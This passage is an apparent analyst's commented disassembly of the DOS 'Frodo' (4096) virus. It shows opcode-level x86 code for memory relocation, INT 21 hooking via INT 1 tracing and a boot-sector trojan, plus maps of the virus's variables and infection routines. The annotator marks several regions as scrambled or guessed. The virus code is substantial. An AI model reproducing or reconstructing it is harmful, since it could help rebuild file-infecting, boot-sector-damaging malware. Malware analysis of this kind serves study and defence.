0F73 7209           JB     0F7E   ;segment then go on.

0F75 8EC0           MOV    ES,AX   ;If new segment is above Frodo's then
0F77 B449           MOV    AH,49   ;release the new mem block.
0F79 E83800         CALL   0FB4    ;Go run INT 21.
0F7C EB2C           JMP    0FAA    ;Go back.

0F7E 4A             DEC    DX      ;Access Frodo's Memory Control Block.
0F7F 8EDA           MOV    DS,DX

0F81 C70601000000   MOV    Word Ptr [0001],0000  ;Set Frodo's block to "free."

0F87 42             INC    DX     ;Get ready to move Frodo to the new
0F88 8EDA           MOV    DS,DX  ;memory block.
0F8A 8EC0           MOV    ES,AX

0F8C 50             PUSH   AX   ;Push seg onto stack for the RETF later.

0F8D 2EA34E12       MOV    CS:[124E],AX  ;Reset int 21 patch for new seg.

0F91 33F6           XOR    SI,SI     ;Copy Frodo to the new mem block.
0F93 8BFE           MOV    DI,SI
0F95 B9000B         MOV    CX,0B00
0F98 F3             REPZ
0F99 A5             MOVSW

0F9A 48             DEC    AX       ;Access the new segment's MCB.
0F9B 8EC0           MOV    ES,AX

0F9D 2EA14912       MOV    AX,CS:[1249]  ;Set the new MCB so that it is
0FA1 26A30100       MOV    ES:[0001],AX  ;owned by DOS.

0FA5 B88A0E         MOV    AX,0E8A  ;Push offset onto stack for RETF.
0FA8 50             PUSH   AX

0FA9 CB             RETF             ;Jump to the new copy of Frodo
                                          ;(jumps to the next line).
0FAA C3             RET                   ;Go back.

;---------------------------------;
; Function 37 handler starts here ;
;---------------------------------;
;Function 37 - Undocumented, get or set switch character ('/' or '-').
;DOS calls this all the time.

0FAB 2EC606F01202   MOV    Byte Ptr CS:[12F0],02  ;Set attrib mask byte to
                                                  ;test for system bit set.
0FB1 E97BF4         JMP    042F   ;Set up and call original int 21.


;*******************************************************************************
;Procedure -- Call original INT 21
0FB4 9C             PUSHF
0FB5 2EFF1E3512     CALL   FAR CS:[1235]
0FBA C3             RET


;-----------------------------------------;
; This is the trojan boot sector that is  ;
; written to the disk after September 22. ;
;-----------------------------------------;

;Lots of this I didn't understand completely, so documentation is lacking.

0FBB FA             CLI

0FBC 33C0           XOR    AX,AX        ;Set up a stack.
0FBE 8ED0           MOV    SS,AX
0FC0 BC007C         MOV    SP,7C00

0FC3 EB4F           JMP    1014         ;Jump past disk data.

;Disk data?
0FC5 DBDB           ESC    1B,BX
0FC7 DB20           ESC    1C,[BX+SI]STCW[BX+SI]

;Data for the message.
0FC9 F9E0E3C3
0FCD 8081111224
0FD2 40
0FD3 81111224
0FD7 40
0FD8 F1
0FD9 F1
0FDA 1224
0FDC 40
0FDD 81211224
0FE1 40
0FE2 8110E3C3
0FE6 800000
0FE9 0000
0FEB 0000
0FED 0000
0FEF 0000
0FF1 8244F870
0FF5 C082448088C082448080
0FFF C08244F070C082288008
1009 C08228808800F210F870C0

1014 0E             PUSH   CS      ;Set DS = CS.
1015 1F             POP    DS

1016 BA00B0         MOV    DX,B000  ;Points to monochrome display buffer.

1019 B40F           MOV    AH,0F    ;Get video mode.
101B CD10           INT    10

101D 3C07           CMP    AL,07    ;Is it monochrome screen?
101F 7403           JZ     1024     ;Yes, so go on.

1021 BA00B8         MOV    DX,B800   ;Points to color display buffer.

1024 8EC2           MOV    ES,DX    ;Set ES = proper display buffer.

1026 FC             CLD             ;Mem operations go up.

;This short thing clears the screen by filling the display buffer with spaces.
1027 33FF           XOR    DI,DI     ;Set ES:DI to display buffer start.
1029 B9D007         MOV    CX,07D0   ;Store 7D0 words.
102C B82007         MOV    AX,0720   ;Store a space with attribute of 7 in buffer.
102F F3             REPZ             ;Do it.
1030 AB             STOSW

1031 BE0E7C         MOV    SI,7C0E   ;Points to 0FC9 here.
1034 BBAE02         MOV    BX,02AE   ;This is where to write in the buffer.
1037 BD0500         MOV    BP,0005
103A 8BFB           MOV    DI,BX     ;Move 02AE into DI.
103C AC             LODSB
103D 8AF0           MOV    DH,AL

103F B90800         MOV    CX,0008

1042 B82007         MOV    AX,0720   ;AX is attr & char (space).
1045 D1E2           SHL    DX,1
1047 7302           JNB    104B
1049 B0DB           MOV    AL,DB
104B AB             STOSW
104C E2F4           LOOP   1042

104E 4D             DEC    BP
104F 75EB           JNZ    103C

1051 81C3A000       ADD    BX,00A0
1055 81FE597C       CMP    SI,7C59
1059 72DC           JB     1037

105B B401           MOV    AH,01    ;Set cursor type.
105D CD10           INT    10

105F B008           MOV    AL,08
1061 BAB97C         MOV    DX,7CB9  ;Points to 1074 here.
1064 E85500         CALL   10BC     ;Set int 8 vector to DS:DX.

1067 B8FE07         MOV    AX,07FE
106A E621           OUT    21,AL    ;Send FE to the hardware int controller.

106C FB             STI

106D 33DB           XOR    BX,BX
106F B90100         MOV    CX,0001

1072 EBFE           JMP    1072         ;Unending loop.

1074 49             DEC    CX      ;This is the new int 8.
1075 750B           JNZ    1082
1077 33FF           XOR    DI,DI
1079 43             INC    BX

107A E80A00         CALL   1087
107D E80700         CALL   1087

1080 B104           MOV    CL,04

1082 B020           MOV    AL,20   ;Tell the 8259 that the interrupt is done.
1084 E620           OUT    20,AL                         

1086 CF             IRET

;*******************************************************************************
;Procedure -- ????????????????????????????????????????
1087 B92800         MOV    CX,0028

108A E82600         CALL   10B3
108D AB             STOSW
108E AB             STOSW
108F E2F9           LOOP   108A

1091 81C79E00       ADD    DI,009E
1095 B91700         MOV    CX,0017
1098 E81800         CALL   10B3

109B AB             STOSW
109C 81C79E00       ADD    DI,009E
10A0 E2F6           LOOP   1098
10A2 FD             STD
10A3 8036E77C01     XOR    Byte Ptr [7CE7],01
10A8 8036D77C28     XOR    Byte Ptr [7CD7],28            
10AD 8036E27C28     XOR    Byte Ptr [7CE2],28            
10B2 C3             RET

;*******************************************************************************
;Procedure -- ????????????????????????????????????????
10B3 83E303         AND    BX,+03
10B6 8A870A7C       MOV    AL,[BX+7C0A]
10BA 43             INC    BX
10BB C3             RET

;*******************************************************************************
;Procedure -- Set vector of interrupt in AL to address in DS:DX.
10BC 06             PUSH   ES           ;Save registers.
10BD 53             PUSH   BX

10BE 33DB           XOR    BX,BX      ;Set ES = 0000.
10C0 8EC3           MOV    ES,BX

10C2 8AD8           MOV    BL,AL      ;Move int number to BL.

10C4 D1E3           SHL    BX,1       ;Multiply it by 4 to get
10C6 D1E3           SHL    BX,1       ;the right offset in memory.

10C8 268917         MOV    ES:[BX],DX     ;Set int vector to the one
10CB 268C5F02       MOV    ES:[BX+02],DS  ;in DS:DX

10CF 5B             POP    BX          ;Restore registers.
10D0 07             POP    ES
10D1 C3             RET

;*******************************************************************************
;Procedure -- Writes a new boot sector trojan.
;Jumps here on or after September 22.
10D2 E811FD         CALL   0DE6  ;Set ints 13 & 24 to Frodo's code.
10D5 B280           MOV    DL,80
10D7 E80800         CALL   10E2
10DA 32D2           XOR    DL,DL
10DC E80300         CALL   10E2
10DF E9AAFD         JMP    0E8C

;*******************************************************************************
;Procedure -- ?????????????????????????????????????
;Called by preceeding procedure.
;THIS IS SCRAMBLED!!! (From 10EA on, I think.)

10E2 B80102         MOV    AX,0201  ;This is PROBABLY a read sector call.
10E5 E81100         CALL   10F9
10E8 7515           JNZ    10FF

10EA 0033           ADD    [BP+DI],DH
10EC 1B7000         SBB    SI,[BX+SI+00]
10EF 0000           ADD    [BX+SI],AL
10F1 0F50           CTS    50
10F3 127F14         ADC    BH,[BX+14]
10F6 F8             CLC
10F7 0FE5           CTS    E5

;*******************************************************************************
;Procedure -- This one is PROBABLY supposed to do an int 13 call.
;Code is corrupted and it will hang on almost all machines.
;Called by preceeding procedure.
10F9 0F00           CTS    00
10FB 119A0E67       ADC    [BP+SI+670E],BX

10FF 0C70           OR     AL,70                         
1101 0033           ADD    [BP+DI],DH
1103 0E             PUSH   CS
1104 2E03991411     ADD    BX,CS:[BX+DI+1114]
1109 11EF           ADC    DI,BP
110B 8E00           MOV    ES,[BX+SI]
110D 0011           ADD    [BX+DI],DL
110F 115012         ADC    [BX+SI+12],DX
1112 92             XCHG   AX,DX
1113 138E8D11       ADC    CX,[BP+118D]
1117 11BF22E8       ADC    [BX+E822],DI
111B F8             CLC
111C F9             STC
111D E88A00         CALL   11AA    ;There is no 11AA!


Memory Addresses used by Frodo:

CS:[0000] - Is set to zero, is probably unused.

CS:[0001] - A jump command to Frodo's code start [JMP 01AA] (3 BYTES).

CS:[0004] - The first word of the host program (WORD).
CS:[0006] - The second word of the host program (WORD).
CS:[0008] - The third word of the host program (WORD).

CS:[00xx] - The rest of the EXE header.

CS:[0012] - The original SS from the EXE header of a host EXE program (WORD).
CS:[0014] - The original SP from the EXE header of a host EXE program (WORD).
CS:[0016] - Unused by Frodo [is Checksum entry of EXE header] (WORD).
CS:[0018] - The original IP from the EXE header of a host EXE program (WORD).
CS:[001A] - The original CS from the EXE header of a host EXE program (WORD).
CS:[001C] - Unused by Frodo [is Reloc. Table Offset entry of EXE header] (WORD).
CS:[001E] - Unused by Frodo [is Overlay Number entry of EXE header] (WORD).
CS:[0020] - Tells whether a file is COM or EXE [00=COM,01=EXE] (BYTE).

CS:[0021] - ???
CS:[0022] - ???

+--------------+
| Frodo's code |
+--------------+

CS:[1200] - Buffer for the first 1C bytes of a file being infected (1C BYTES).

CS:[121C] - ??? - Unused (4 WORDS).

CS:[1224] - Pointer to EXEC function Parameter Block of caller (DWORD).
CS:[1228] - Drive number of next disk operation [00=default,01=A,02=B,etc.] (BYTE).
CS:[1229] - File time [of infected file] (WORD).
CS:[122B] - File date [of infected file] (WORD).
CS:[122D] - Original int ??? address [It changes] (DWORD).
CS:[1231] - Address of original int 1 handler (DWORD).
CS:[1235] - Segment and offset of original int 21 (DWORD).
CS:[1239] - Original int ??? address [It changes, I think] (DWORD).
CS:[123D] - Address of original int 24 error handler (DWORD).
CS:[1241] - Address of the int 13 caller (DWORD).
CS:[1245] - Original DS on startup (WORD).
CS:[1247] - Segment of first Memory Control Block (WORD).
CS:[1249] - PSP segment of owner of [first] memory block (WORD).
CS:[124B] - Five byte buffer for first 5 bytes of real int 21 (5 BYTES).

CS:[1250] - Flag for int 1 handler, telling how it should respond (BYTE).

CS:[1251] - Counter for int 1 handler, is used by Frodo's int 21 handler (BYTE).

CS:[1252] - Table of PSP segments of programs with open files - (14 WORDS).
CS:[127A] - Corresponding table of the open files' handles - (14 WORDS).
CS:[12A2] - Number of free table entries in the previous two tables - (BYTE).

CS:[12A3] - PSP segment of current process (WORD).
CS:[12A5] - Current file pointer [of infected file] (DWORD).
CS:[12A9] - File size [of infected file] (DWORD).
CS:[12AD] - Offset of calling program's buffer for file I/O with handle (WORD).
CS:[12AF] - Number of bytes to transfer for file I/O with handle (WORD).
CS:[12B1] - Number of bytes already transferred for file I/O w/handle (WORD).
CS:[12B3] - Flags of calling program (WORD).
CS:[12B5] - A copy of the FCB that the caller is using (25 BYTES).
CS:[12DA] - Frodo's int 24 handler status byte [01=error] (BYTE).
CS:[12DB] - Flags of the int 13 caller (WORD).

CS:[12DD] - Frodo's SS [used by int 1 and proc. 0DE6] (WORD).
CS:[12DF] - Frodo's SP [used by int 1 and proc. 0DE6] (WORD).

CS:[12E0] - Unused (BYTE).

CS:[12E1] - Original Break Flag setting (BYTE).

CS:[12E2] - Flag showing whether it's okay to move Frodo [00=not okay] (BYTE).

CS:[12E3] - Where the original value of AX is saved (WORD).
CS:[12E5] - Original hardware interrupt mask from port 21 (BYTE).
CS:[12E6] - IP of function 4B caller [Used by Frodo's function 4B handler] (WORD).
CS:[12E8] - CS of function 4B caller [Used by Frodo's function 4B handler] (WORD).
CS:[12EA] - Address to jump to; used by procedures 0EC7 and 0EF3 (WORD).
CS:[12EC] - Number of free clusters on [current] disk (WORD).
CS:[12EE] - DOS version number (BYTE).
CS:[12EF] - Flag telling if Frodo can adjust the # of free clusters [00=no] (BYTE).
CS:[12F0] - Mask to AND file's attribute with, esp. for DOS' "dir" command (BYTE).
CS:[12F1] - EXEC function parameter block is copied here (25 BYTES).
CS:[12FF] - Child's SS:SP on startup [set by EXEC fn 1] (DWORD).
CS:[1303] - Child's CS:IP on startup [set by EXEC fn 1] (DWORD).
CS:[1307] - Filename used by the EXEC function (50 BYTES).
CS:[1357] - SP of current process is stored here (WORD).
CS:[1359] - SS of current process is stored here (WORD).
CS:[135B] - SP of Frodo's stack [SS=CS] (WORD).

CS:[13xx] - ??? - SPACE FOR STACK.

CS:[1600] - This is the top of Frodo's stack.


Procedures called in Frodo:

01B5 - Set ES:BX to the address of the interrupt in AL.
06A1 - Set DS:BX to current Disk Transfer Area.
08B3 - Infect a COM or EXE file.
0975 - Load the first 1C bytes of a file to infect into two buffers in Frodo.
09D3 - Write virus to file; BX = handle, DI = # of bytes to paragraph boundary.
0A39 - Find out if a file is a program from an FCB; CF=set if not.  Also sets CS:[0020].
0A45 - Find out if a file is a program from an ASCIIZ name; CF=set if not.  Also sets CS:[0020].
0A91 - Get PSP segment of current process and save it at CS:[12A3].
0A9E - Make sure there's room to infect a file and, if so, open the file.
0B06 - Find out if a handle is an infected file; Zero Flag is set if so.
0B24 - Get file length without disturbing file ptr; BX = file handle.
0DE6 - Checks for hard disk, does a reset, sets ints 13 & 24 to Frodo's code.
0E8C - Sets int 13 and int 24 vectors to original values.
0EA7 - Save original Break flag setting and set it to zero.
0EBB - Restore original Break flag setting.
0EC7 - Save all registers and return to caller.
0EDA - Switch first 5 bytes of real int 21 handler with a 5 byte jump to Frodo.
0EF3 - Restore all registers and return to caller.
0F06 - Save all registers on Frodo's stack.
0F0F - Restore all registers from Frodo's stack.
0F3C - Save address of real int 1 in memory, and set int 1 to Frodo's code.
0F5A - Try to move Frodo in case someone wants a new memory block.
0FB4 - Call original int 21.

1087 - ??? - Is part of the trojan boot sector.
10B3 - ??? - Is part of the trojan boot sector.

10BC - Set vector of interrupt in AL to address in DS:DX.
10D2 - Write a boot sector trojan to the A and C drives.
10E2 - This one is PROBABLY supposed to do the BIOS write call, but code is trashed.
10F9 - This one is PROBABLY supposed to do an int 13 call, but code is trashed.
11AA - DOESN'T EXIST!!!

;;;;;;;;;;;;;;;;;;;;;;;;;

; Seguir en 066F Linea 935


INT 21 Subfunctions:
    Subfunction Offset  Function Name
        30      077C    Get DOS Version
        23      044E    Get File Size Using FCB
        37      0E8B    Get/Set Switch Character
        4B      058B    Exec
        3C      04D5    Create File Using Handle
        3D      0511    Open File Using Handle
        3E      0555    Close File Using Handle
        0F      039B    Open File Using FCB
        14      03CD    Sequential Read Using FCB
        21      03C1    Random Read Using FCB
        27      03BF    Random Block Read Using FCB
        11      0359    Search for First Entry Using FCB
        12      0359    Search for Next Entry Using FCB
        4E      049F    Find First Matching File
        4F      049F    Find Next Matching File
        3F      0AA5    Read from File or Device Using Handle
        40      0B8A    Write to File or Device Using Handle
        42      0A90    Move File Pointer Using Handle
        57      0A41    Get Set File Date & Time Using Handle
        48      0E34    Allocate Memory
Variables:
        0004-0020 = Bytes Readed from file to infect .EXE Header Without Rel.Tbl
        0012 DWord= Original SS:SP in .EXE Header.
                12   Word = SP
                14   Word = SS
        0018 DWord= Original CS:IP in .EXE Header.
                18   Word = IP
                1A   Word = CS
        0020 Byte = 00 At exit from 0925 If .COM
                    01 and Carry Clear   If .EXE
        1200-121C = Bytes Readed from file to infect .EXE Header Without Rel.Tbl
        1224 DWord= Into Exec. Address of Parameter Block
                1224 Word = Offsset
                1226 Word = Segment
        1228 Byte = Drive Number
        1229 Word = File Time
        122B Word = File Date
        122D DWord= INT 21 Address at Entry (Then is changed to Real INT 21 Adr)
                122D Word = INT 21 Offset
                122F Word = INT 21 Segment
                    INT 13 Addres Too, changed to original by INT 01 Procedure
        1231 DWord= INT 01 Address at Entry
                1231 Word = INT 01 Offset
                1233 Word = INT 01 Segment
        1235 DWord= INT 21 Real INT 21 Address, obtained with INT 01 Reoutine
                1235 Word = INT 21 Offset
                1237 Word = INT 21 Segment
        123D DWord= INT 24 Address at Entry
                123D Word = INT 24 Offset
                123F Word = INT 24 Segment
        1245 Word = DS Inicial
        1247 Word = First Memory Control Block Segment
        1249 Word = PSP Segment's of First Memory Control Block
        124B      = JMP FAR CS:02CC / Original Entry Code to INT 21
        124E Word = Into Allocate Memory, New Free Segment Allocated.1600h Bytes
        1250 Byte = Subfunction for INT 1 Rutine=
                    00 To Set [122D]=INT 21 Address     Called From Main Rutine
                    01 To Jmp INT 21 And After It Restore JMP FAR CS:02CC
                                            Called From INT 21 Resident Portion
                    02 To Set [122D]=INT 13 Address     Called From
        1251 Byte = 04 ?? (031C)
        12A2 Byte = ??
        12A3 Word = PSP Segment of Loaded Subproccess
        12A9 DWord= File Length
        12B3 Word = INSIDE INT 21, flags before entering.
        12B5-12DA = INSIDE INT 21, Buffer
        12DA Byte = Flag:
                        00 If HS's IRQ & FPY's IRQ Points to BIOS while geting
                            INT 13 Pointer.
                        02 If one thasn't points
        12DD Word = From here is copied SS after finding the Real INT 21 Addr
        12DF Word = From here is copied SP after finding the Real INT 21 Addr
        12E1 Byte = INSIDE INT 21, Ctrl-Break Status INT 21/33
        12E2 Word = 4B00/0000
        12E5 Byte = Status of IRQs Masks before turning them all off
        12EA Word = Point to Return in popa/pusha Routines
        12EC Word = Free Clusters On Drive in [1228] after calling 097E
        12EE Byte = Trunc(Dos Version)
        12FF Byte = Incremented If Calling 0793 Inside EXEC Function
        12F0 Byte = Mask for anding to file's attr changed to 02 in Switch Char
        12F1-12FF = Into Exec Rutine Copy of Parameter Block
        1307-1357 = Into Exec Rutine Copy of ASCIIZ PathName
        1357 Word = Stack Pointer (SP) After Init Process
        1359 Word = Stack Segment (SS) After init Process
        135B Word = Starts in 1600h and changes with SP for popa/pusha
        135D Wrod = 0DD3/0DA7

Subroutines:
        Addres  Function                Input           Output

        0023    Interrupt 01 "Internal" -               -
                Entry Point
        0095    Get Interrupt Vector    AL = INT #      ES:BX -> INT ISR
        02CC    External INT 21 Entry   -               -
                Point
        0581    Make DS:BX Point To     -               DS:BX -> DTA
                Current DTA                             AH=2F
        0855    Gate Date&Time,         BX = FHandle    [1229] = File Time
                Read Header, Seek EOF                   [122B] = File Date
                                                        [12A9] = File Length
                                                        DX = Size's High Word
                                                        DI = Size's Low Mod 512
                                                        SI = Size & 0F



        0919    Check if FCB file's name DS:DX -> FName Carry 1:not EXE, not COM
                is .EXE, .COM or neither.               Carry 0:EXE or COM
                                                            [0020] = 00 If COM
                                                            [0020] = 01 If EXE
                                                                     or neither
        0925    Check if file name is   DS:DX -> FName  Carry 1:not EXE, not COM
                .EXE, .COM or neither.                  Carry 0:EXE or COM
                                                            [0020] = 00 If COM
                                                            [0020] = 01 If EXE
                                                                     or neither
        0971    Get PSP Segment         -               -
                to [12A3]
        097E    Open File for R/W       ES:DX -> FName  BX = FFFF If Error
                                        [1228] = Drive# BX = Handle If Not Error
                                                        [12EC] = Free Clusters

        0C89    External INT 13 Entry   -               -
                Point
        0CC6    Make [122D] Point to    -               -   [122D] -> BIOS' 13h
                BIOS' Original INT 13
        0CBD    External INT 24 Entry   -               -
                Point
        0D6C    Restore INT 13h &       -               -
                INT 24h to Original
        0D87    Set Ctrl-Break check    -               -
                to False
        0D9B    Restore Ctrl-Break      -               -
                Check Status
        0DA7    pusha: Push All And     -               -
                Jump To [Stack Top]
        0DBA    Sets And restores       [124B] Proper   [124B] the values
                INT 21, swapping a      values to swap  at the Entry Code
                JMP FAR CS:02CC with                    to INT 21
                the real code in the
                entry to INT 21
        0DD3    popa: Pop All And Jump  -               -
                To [Stack Top] (RETN)
        0DE6    Set Stack to 4096's     -               -
                Stack & popa
        0DEF    Set Stack to 4096's     -               -
                Stack & pusha
        0E1C    Save INT 01 Vector      -               -
                & Set it to CS:0023
        0E30    Set Interrupt Vector    AL = INT #      DS:DX -> INT ISR
        0E3A    Allocate Memory         BX = Paras Cnt  CF = 1  If Error
                                                        AX = Allocated Segment
                                                        AX = Error Code CF = 1
                                                        BX = Size of Largest MB
        0E94    Call INT 21             [1235]->INT 21
        0F9C    Set Interrupt Vector    AL = INT #      DS:DX -> INT ISR

0001 E9 A7 00                JMP 0AB
0004 4D                      DEC BP
0005 5A                      POP DX
0006 1B 01                   SBB AX,W[BX+DI]
0008 10 00                   ADC B[BX+SI],AL
000A 00 00                   ADD B[BX+SI],AL
000C 20 00                   AND B[BX+SI],AL
000E 4C                      DEC SP
000F 00 FF                   ADD BH,BH
0011 FF 16 02 80             CALL W[08002]
0015 00 00                   ADD B[BX+SI],AL
0017 00 10                   ADD B[BX+SI],DL
0019 00 BC 01 1E             ADD B[SI+01E01],BH
001D 00 00                   ADD B[BX+SI],AL
001F 00 01                   ADD B[BX+DI],AL
0021 FE 3A                   DB B[BP+SI]

                        ; "Internal" INT 01 Entry Point

0023 55                      PUSH BP                    ; Saves BP
0024 8B EC                   MOV BP,SP                  ; BP=SP (To Point Stack)
0026 50                      PUSH AX                    ; Save AX
0027 81 7E 04 00 C0          CMP W[BP+4],0C000          ; If Caller's Seg>=C000
002C 73 0C                   JAE 03A                    ; Running BIOS?  003A
002E 2E A1 47 12             MOV AX,CS:W[01247]         ; AX=1; MCB Segment
0032 39 46 04                CMP W[BP+4],AX             ; If Caller's Seg<=1;MCB
0035 76 03                   JBE 03A                    ; Running DOS?  003A
0037 58                      POP AX                     ; Restores AX
0038 5D                      POP BP                     ; Restores BP
0039 CF                      IRET                       ; Return
                                                        ; Here if running BIOS
                                                        ; or DOS.

                                ; [1250]=0 To Get INT 21 Pointer
                                ; [1250]=1 To Jmp INT 21 and swap JMP Area
                                ; [1250]=2 To Get INT 13 Pointer

003A 2E 80 3E 50 12 01       CMP CS:B[01250],1          ;
0040 74 32                   JE 074                     ; If Called from 21? 
0042 8B 46 04                MOV AX,W[BP+4]             ; AX=Caller's Segment
0045 2E A3 2F 12             CS MOV W[0122F],AX         ; [122F]=INT 21 Segment
0049 8B 46 02                MOV AX,W[BP+2]             ; AX=Caller's Segment
004C 2E A3 2D 12             CS MOV W[0122D],AX         ; [122D]=INT 21 Offset
0050 72 15                   JB 067                     ; [1250]=00 ?  0067
0052 58                      POP AX                     ; Restores AX
0053 5D                      POP BP                     ; Restores BP
0054 2E 8E 16 DD 12          CS MOV SS,W[012DD]         ; SS=[12DD]
0059 2E 8B 26 DF 12          CS MOV SP,W[012DF]         ; SP=[12DF]
005E 2E A0 E5 12             CS MOV AL,B[012E5]         ; AL=[12E5] IRQs Masks
0062 E6 21                   OUT 021,AL                 ; Restores IRQs Masks
0064 E9 D9 0C                JMP 0D40                   ; (*)
0067 81 66 06 FF FE          AND W[BP+6],0FEFF          ; Clears Trap Flag
006C 2E A0 E5 12             MOV AL,CS:B[012E5]         ; Restores IRQs masks
0070 E6 21                   OUT 021,AL                 ;
0072 EB C3                   JMP 037                    ; Return

                                                 ; Here if came from
                                                 ; 4096's INT 21
0074 2E FE 0E 51 12          DEC CS:B[01251]            ; 4--
0079 75 BC                   JNE 037                    ; goes on if 4 tims here
007B 81 66 06 FF FE          AND W[BP+6],0FEFF          ; Clears Trap Flag
0080 E8 6C 0D                CALL 0DEF                  ; stack & pusha
0083 E8 34 0D                CALL 0DBA                  ; Set INT 21 to 4096
0086 2E C5 16 31 12          LDS DX,CS:[1231]           ; DS:DX = INT 01 ;r
008B B0 01                   MOV AL,1                   ;
008D E8 0C 0F                CALL 0F9C                  ; Restore INT 01 ;r
0090 E8 53 0D                CALL 0DE6                  ; stack & popa
0093 EB D2                   JMP 067                    ; Trap & IRQ + IRET

                        ; Subrutine. Get Interrupt Vector
                        ; Input:
                        ;    AL = Interrupt Number
                        ; Output:
                        ;    ES:BX -> Pointer to ISR (Interrupt Service Routine)
                        ;    AH = 00

0095 1E                      PUSH DS
0096 56                      PUSH SI
0097 33 F6                   XOR SI,SI
0099 8E DE                   MOV DS,SI
009B 32 E4                   XOR AH,AH
009D 8B F0                   MOV SI,AX
009F D1 E6                   SHL SI,1
00A1 D1 E6                   SHL SI,1
00A3 8B 1C                   MOV BX,W[SI]
00A5 8E 44 02                MOV ES,W[SI+2]
00A8 5E                      POP SI
00A9 1F                      POP DS
00AA C3                      RET

                        ; External Entry Point Into Program

00AB 2E C7 06 5B 13 00 16    CS MOV W[0135B],01600      ; [135B]=1600
00B2 2E A3 E3 12             CS MOV W[012E3],AX         ; [12E3]=AX
00B6 B4 30                   MOV AH,030                 ; Get Dos Version
00B8 CD 21                   INT 021                    ; AL=Trunc(Version)
                                                        ; AH=Frac(Version)
00BA 2E A2 EE 12             CS MOV B[012EE],AL         ; [12EE]=Trunc(Version)
00BE 2E 8C 1E 45 12          CS MOV W[01245],DS         ; [1245]=DS
00C3 B4 52                   MOV AH,052                 ;
00C5 CD 21                   INT 021                    ; ES:BX Dos InVars
00C7 26 8B 47 FE             ES MOV AX,W[BX-2]          ; AX=1;MCB Segment
00CB 2E A3 47 12             CS MOV W[01247],AX         ; [1247]=1;MCB Segment
00CF 8E C0                   MOV ES,AX                  ; ES=1;MCB Segment
00D1 26 A1 01 00             MOV AX,ES:W[1]             ; AX=PSP owner  Segment
00D5 2E A3 49 12             MOV CS:W[01249],AX         ; [1249]=PSP  Segment
00D9 0E                      PUSH CS                    ;
00DA 1F                      POP DS                     ; DS=CS
00DB B0 01                   MOV AL,1                   ; Get INT 01 Vector
00DD E8 B5 FF                CALL 095                   ; to ES:BX
00E0 89 1E 31 12             MOV W[01231],BX            ; [1231]=INT 1 Ofs
00E4 8C 06 33 12             MOV W[01233],ES            ; [1233]=INT 1 Seg
00E8 B0 21                   MOV AL,021                 ; Get INT 21 Vector
00EA E8 A8 FF                CALL 095                   ; to ES:BX
00ED 89 1E 2D 12             MOV W[0122D],BX            ; [122D]=INT 21 Ofs
00F1 8C 06 2F 12             MOV W[0122F],ES            ; [122F]=INT 21 Seg
00F5 C6 06 50 12 00          MOV B[01250],0             ; [1250]=00
00FA BA 23 00                MOV DX,023                 ; DX=0023
00FD B0 01                   MOV AL,1                   ; AL=01
00FF E8 9A 0E                CALL 0F9C                  ; Set INT 01 to CS:0023
0102 9C                      PUSHF                      ;
0103 58                      POP AX                     ;
0104 0D 00 01                OR AX,0100                 ;
0107 50                      PUSH AX                    ; AX=Flags Or Trap Flag
0108 E4 21                   IN AL,021                  ; Save Status of IRQs
010A A2 E5 12                MOV B[012E5],AL            ; Masks in [12E5]
010D B0 FF                   MOV AL,0FF                 ; 
010F E6 21                   OUT 021,AL                 ; Turn all IRQs off
                                                        ; Turn off Hardware
                                                        ; Debbuging
0111 9D                      POPF                       ; Set Trap (INT 01) Flag
0112 B4 52                   MOV AH,052                 ; Do an INT 21. This is
0114 9C                      PUSHF                      ; for getting the real
0115 FF 1E 2D 12             CALL D[0122D]              ; INT 21 Address with
                                                        ; INT 1 Instaled Handler
0119 9C                      PUSHF                      ;;
011A 58                      POP AX                     ;;
011B 25 FF FE                AND AX,0FEFF               ;; Clears Trap Flag
011E 50                      PUSH AX                    ;;
011F 9D                      POPF                       ;;
0120 A0 E5 12                MOV AL,B[012E5]            ;;; Set Up IRQs Masks
0123 E6 21                   OUT 021,AL                 ;;;
0125 1E                      PUSH DS                    ;
0126 C5 16 31 12             LDS DX,[01231]             ;;DS:DX=Previous INT 01
012A B0 01                   MOV AL,1                   ;;
012C E8 6D 0E                CALL 0F9C                  ;;Restore INT 01 Pointer
012F 1F                      POP DS                     ; DS=DS
0130 C4 3E 2D 12             LES DI,[0122D]             ; ES:DI=Original INT 21
0134 89 3E 35 12             MOV W[01235],DI            ; [1235]=INT 21 Ofs
0138 8C 06 37 12             MOV W[01237],ES            ; [1237]=INT 21 Seg
013C C6 06 4B 12 EA          MOV B[0124B],0EA           ; [124B]=JMP Far (EA)
0141 C7 06 4C 12 CC 02       MOV W[0124C],02CC          ; [124C]=02CC
0147 8C 0E 4E 12             MOV W[0124E],CS            ; [124E]=CS
014B E8 6C 0C                CALL 0DBA                  ; Set INT 21 To CS:02CC
                                                        ; Copies a JMP FAR in
                                                        ; Original INT 21 Routine
                                                        ; And swaps original bytes
014E B8 00 4B                MOV AX,04B00               ; AX=4B00 (21/Exec)
0151 88 26 E2 12             MOV B[012E2],AH            ; [12E2]=4B00
0155 BA 21 00                MOV DX,021                 ; DX=0021
0158 FF 36 20 00             PUSH W[020]                ; [0020]=FE
015C CD 21                   INT 021                    ; Exec (*)
015E 8F 06 20 00             POP W[020]                 ;
0162 26 83 45 FC 09          ES ADD W[DI-4],9
0167 90                      NOP
0168 8E 06 45 12             MOV ES,W[01245]
016C 8E 1E 45 12             MOV DS,W[01245]
0170 81 2E 02 00 61 01       SUB W[2],0161
0176 8B 2E 02 00             MOV BP,W[2]
017A 8C DA                   MOV DX,DS
017C 2B EA                   SUB BP,DX
017E B4 4A                   MOV AH,04A
0180 BB FF FF                MOV BX,-1
0183 CD 21                   INT 021
0185 B4 4A                   MOV AH,04A
0187 CD 21                   INT 021
0189 4A                      DEC DX
018A 8E DA                   MOV DS,DX
018C 80 3E 00 00 5A          CMP B[0],05A
0191 74 05                   JE 0198
0193 2E FE 0E E2 12          CS DEC B[012E2]
0198 2E 80 3E E2 12 00       CS CMP B[012E2],0
019E 74 05                   JE 01A5
01A0 C6 06 00 00 4D          MOV B[0],04D
01A5 A1 03 00                MOV AX,W[3]
01A8 8B D8                   MOV BX,AX
01AA 2D 61 01                SUB AX,0161
01AD 03 D0                   ADD DX,AX
01AF A3 03 00                MOV W[3],AX
01B2 42                      INC DX
01B3 8E C2                   MOV ES,DX
01B5 26 C6 06 00 00 5A       ES MOV B[0],05A
01BB 2E FF 36 49 12          CS PUSH W[01249]
01C0 26 8F 06 01 00          ES POP W[1]
01C5 26 C7 06 03 00 60 01    ES MOV W[3],0160
01CC 42                      INC DX
01CD 8E C2                   MOV ES,DX
01CF 0E                      PUSH CS
01D0 1F                      POP DS
